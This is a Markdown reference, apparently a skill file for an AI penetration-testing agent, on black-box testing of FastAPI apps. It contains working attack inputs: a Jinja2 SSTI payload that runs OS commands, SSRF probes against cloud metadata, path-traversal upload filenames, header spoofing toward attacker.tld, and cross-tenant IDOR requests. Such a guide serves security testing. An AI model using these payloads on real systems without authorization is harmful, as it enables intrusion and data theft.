---
name: FastAPI
description: Reference for black-box testing FastAPI / Starlette apps covering OpenAPI mining, dependency-injection auth gaps, Pydantic validation bypass, CORS / proxy header trust, Jinja SSTI, and WebSocket auth.
---

# FastAPI

Reference for testing FastAPI / Starlette / ASGI targets over their public surface: OpenAPI docs, route handlers, dependencies, WebSocket gateways, mounted subapps, and proxy-header trust. Pull this in when the target ships `/docs`, `/redoc`, or `/openapi.json`.

> Black-box scope: probes drive HTTP, WebSocket, and the OpenAPI schema. There is no source-code analysis step.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| HTTP probes | `execute_curl` | Always capture full headers; FastAPI errors leak useful diagnostics. |
| OpenAPI fetch + diff | `execute_curl` + `kali_shell jq` | `/openapi.json` -> path/parameter/security-scheme map. |
| Hidden-path fuzz | `execute_ffuf` | After enumerating `include_in_schema=False` candidates from the OpenAPI prefixes. |
| WebSocket probes | `execute_code` | `websockets` lib. |
| Hidden parameter discovery | `execute_arjun` | Each known endpoint -> param brute. |

## Stack fingerprint

| Signal | Confirms |
|---|---|
| `server: uvicorn` (no version) or `uvicorn` echo | ASGI / FastAPI likely |
| `/docs`, `/redoc`, `/openapi.json` reachable | FastAPI |
| `WWW-Authenticate: Bearer` from `OAuth2PasswordBearer` | FastAPI Security utility |
| Pydantic-style validation errors: `{"detail":[{"loc":[...], "msg":"...", "type":"..."}]}` | Pydantic / FastAPI |
| `422 Unprocessable Entity` on schema violations | FastAPI default |

## Reconnaissance

### OpenAPI mining

```
execute_curl url: "https://target.tld/openapi.json"
execute_curl url: "https://target.tld/api/openapi.json"
execute_curl url: "https://target.tld/v1/openapi.json"
execute_curl url: "https://target.tld/internal/openapi.json"
execute_curl url: "https://target.tld/docs"
execute_curl url: "https://target.tld/redoc"
```

Parse:

```
kali_shell: curl -s https://target.tld/openapi.json | jq -r '.paths | keys[]' | sort -u            # path inventory
kali_shell: curl -s https://target.tld/openapi.json | jq '.components.securitySchemes'             # auth model
kali_shell: curl -s https://target.tld/openapi.json | jq '.servers'                                # server URLs (often hint at hidden envs)
kali_shell: curl -s https://target.tld/openapi.json | jq -r '.paths | to_entries[] | "\(.key)\t\(.value | keys | join(","))"' | sort
```

### include_in_schema=False fuzz

`include_in_schema=False` hides routes from `/openapi.json` but they still exist. Build a list of likely admin / debug names, prefix with each schema path-base, and fuzz:

```
kali_shell: curl -s https://target.tld/openapi.json | jq -r '.paths | keys[]' | grep -oE '^/[^/]+' | sort -u > /tmp/prefixes.txt
execute_ffuf args: "-w /tmp/wordlist.txt -u https://target.tld/api/admin/FUZZ -mc 200,401,403,422 -ac -t 20 -rate 50 -noninteractive -of json -o /tmp/ffuf_admin.json"
```

Useful suffixes: `/admin`, `/debug`, `/internal`, `/health/full`, `/metrics`, `/_status`, `/users/list`, `/jobs`, `/queues`, `/openapi-internal.json`.

### Mounted subapps

```
GET /admin/             # Admin UI mount
GET /static/            # StaticFiles mount
GET /metrics            # /metrics endpoint
GET /flower/            # Celery Flower
GET /apidocs            # alt docs path
GET /storage/           # storage browser
```

Mounts often skip the parent app's middlewares (CORS, auth dependencies). Confirm by sending the same auth probe to a mounted route and to a top-level route.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history. `redamon.sitemap` lists the endpoints already observed and `redamon.search {q:"openapi.json"}` (or `{bodyq:"securitySchemes"}`) finds a captured `/openapi.json` you can `redamon.get(id,"response")` for the path/security map without re-fetching. Drive the auth and IDOR matrix off real captured requests with `redamon.replay`: `dropHeaders:["Authorization"]` to test routes missing the security dep, `param:{"id":"FOREIGN"}` (or edit `path`) to swap object IDs, `headers:{"x-tenant-id":"OTHER_ORG"}` to inject a tenant, `headers:{"Content-Type":"application/x-www-form-urlencoded"}` with a re-encoded `body` for the parser differential, and `headers:{"x-forwarded-for":"127.0.0.1"}` to spoof the proxy gate. `redamon.fuzz(id,"id",[...])` enumerates a sequential/uuid ID over one query param (loop `redamon.replay` for header or body positions, which `redamon.fuzz` cannot reach); `redamon.params` flags hidden or injectable params seen in traffic. `redamon.diff(owner_id, foreign_id)` gives the owner-vs-foreign delta. Caveats: `redamon.replay` is pinned to the origin host, and `proxy_brain` only see traffic that went through the capture proxy.

## Attack matrix

### Authentication / authorization

| Probe | Outcome |
|---|---|
| Strip `Authorization` header on every endpoint | Routes missing the security dep |
| Use `Depends(get_user)` instead of `Security(get_user, scopes=[...])` | Scopes not enforced |
| Token presence treated as auth (no signature check) | Forge a syntactically valid JWT and replay |
| `OAuth2PasswordBearer` token used at endpoints with no validation chain | Bearer accepted by name |
| Cross-router enforcement drift | Same operation behind two routers; one drops the dep |

JWT is the dominant auth path; pivot to `/skill jwt_attacks` for the algorithm-confusion / kid / jku matrix.

### IDOR via dependencies

```
# Owner vs non-owner using the same token
execute_curl url: "https://target.tld/api/orders/OWN_ID"   headers: "Authorization: Bearer $TOKEN_A"
execute_curl url: "https://target.tld/api/orders/FOREIGN"  headers: "Authorization: Bearer $TOKEN_A"
```

Tenant header trust:

```
execute_curl url: "https://target.tld/api/orders" headers: "Authorization: Bearer $TOKEN_A\nx-tenant-id: OTHER_ORG"
execute_curl url: "https://target.tld/api/orders" headers: "Authorization: Bearer $TOKEN_A\nx-organization: OTHER_ORG"
```

Background tasks frequently re-execute on stored IDs without re-validating ownership. Trigger an export / job creation and check whether the worker honors the original principal at execution time.

### Pydantic validation bypass

| Technique | Probe |
|---|---|
| Type coercion (`transform`-style) | `{"isAdmin":"true"}` becomes `True`; `{"count":"-1"}` becomes `-1` |
| Empty string -> None | `{"role":""}` may bypass `Optional[str]` checks |
| Extra fields when `extra="allow"` | Inject `role`, `isAdmin`, `tenantId` |
| Unions chosen by parser order | Submit a shape that hits the lax branch |
| Nested model not annotated `@Type` | Validators skip nested objects |
| Array elements unvalidated | `[{"role":"admin"},...]` bypasses per-element checks |

```
execute_curl url: "https://target.tld/api/users" method: "POST" headers: "Authorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"name":"x","email":"x@x","is_admin":true,"tenant_id":"OTHER_ORG"}'
```

### Content-type switching

```
# Same logical input, different parsers
Content-Type: application/json                           {"id":1}
Content-Type: application/x-www-form-urlencoded          id=1
Content-Type: multipart/form-data                         (boundary-encoded)
Content-Type: application/json; charset=utf-7             # rare but real
```

Different content types route through different validators; one branch may skip a check the other enforces.

### CORS

```
execute_curl url: "https://target.tld/api/me" headers: "Origin: https://attacker.tld"
# Watch for:
#   Access-Control-Allow-Origin: https://attacker.tld    (reflection)
#   Access-Control-Allow-Credentials: true               (with reflection = data exfil)
#   Access-Control-Allow-Origin: *                       (with credentials? spec says reject; some servers set both)
```

Probe `allow_origin_regex` over-permissive patterns: `^https://.*\.attacker-controlled\.tld$`.

### Proxy / host trust

```
# Spoof the proxy headers
execute_curl url: "https://target.tld/api/admin" headers: "x-forwarded-for: 127.0.0.1"
execute_curl url: "https://target.tld/api/admin" headers: "x-real-ip: 127.0.0.1"
execute_curl url: "https://target.tld/api/admin" headers: "x-forwarded-proto: https"
execute_curl url: "https://target.tld/" headers: "Host: attacker.tld"
```

Without `TrustedHostMiddleware` or with `ProxyHeadersMiddleware` configured outside a trusted network boundary, IP-based gates fall to header injection.

### Jinja2 SSTI

```
{{7*7}}
{{ "".__class__.__mro__[1].__subclasses__() }}
{{cycler.__init__.__globals__['os'].popen('id').read()}}
```

Common surfaces: email-template preview, profile-bio rendering, server-side report generators. Fingerprint engine first; the canonical Jinja2 escape path is `cycler.__init__.__globals__['os'].popen(...)`.

### SSRF via fetch

| Probe |
|---|
| `?url=http://169.254.169.254/latest/meta-data/` (AWS) |
| `?url=http://metadata.google.internal/computeMetadata/v1/` with header `Metadata-Flavor: Google` |
| `?url=http://localhost:8000/` |
| `?url=gopher://...` (rare; only with curl-like libs) |
| `?url=https://attacker.tld/redir` (302 -> internal) |

Test redirect-following: many `httpx`/`requests` configurations follow 3xx by default.

### File upload

```
# UploadFile.filename traversal
multipart filename="../../../var/www/html/shell.php"
multipart filename="../etc/passwd%00.png"
multipart filename="..\\..\\windows\\system32\\config\\sam"
```

Verify the served URL doesn't execute the upload (e.g. `.html` served as `text/html` from the upload directory) and that `Content-Type` is forced.

### WebSocket

```
execute_code language: python
import asyncio, websockets
async def go():
    async with websockets.connect("wss://target.tld/ws") as ws:
        await ws.send('{"op":"subscribe","topic":"orders:OTHER_USER"}')
        for _ in range(20):
            print(await ws.recv())
asyncio.run(go())
```

Probes:

- Connect with no Authorization. If the handshake succeeds, per-message auth is the only barrier.
- Subscribe to other-user topics. Filter args trusted == cross-user leak.
- Replay handshake with expired token.

## OpenAPI parity probing

Endpoints listed in OpenAPI may behave differently from the same endpoint reached via `/v2/` or a mounted subapp. Compare:

```
kali_shell: diff <(curl -s https://target.tld/openapi.json | jq '.paths | keys') <(curl -s https://target.tld/v2/openapi.json | jq '.paths | keys')
```

## Validation shape

A clean FastAPI finding includes:

1. Stack fingerprint (FastAPI + uvicorn version if leaked).
2. The OpenAPI definition of the route (or the documented absence of it via 404 differential).
3. Side-by-side requests proving cross-user / unauthenticated / cross-tenant access.
4. For SSTI: the `{{7*7}}` body and a follow-up RCE proof bounded to a single OOB callback.
5. For SSRF: the metadata exfil response or its absence with an `interactsh-client` callback log.

## Hand-off

```
JWT issues               -> /skill jwt_attacks
OAuth flows              -> /skill oauth_oidc
GraphQL mounts (Strawberry/Graphene) -> /skill graphql
SQL via raw queries      -> built-in sql_injection skill
SSTI confirmed           -> kali_shell sstimap / tplmap
WebSocket per-message    -> /skill graphql (subscriptions section), or specific WS skill when shipped
```
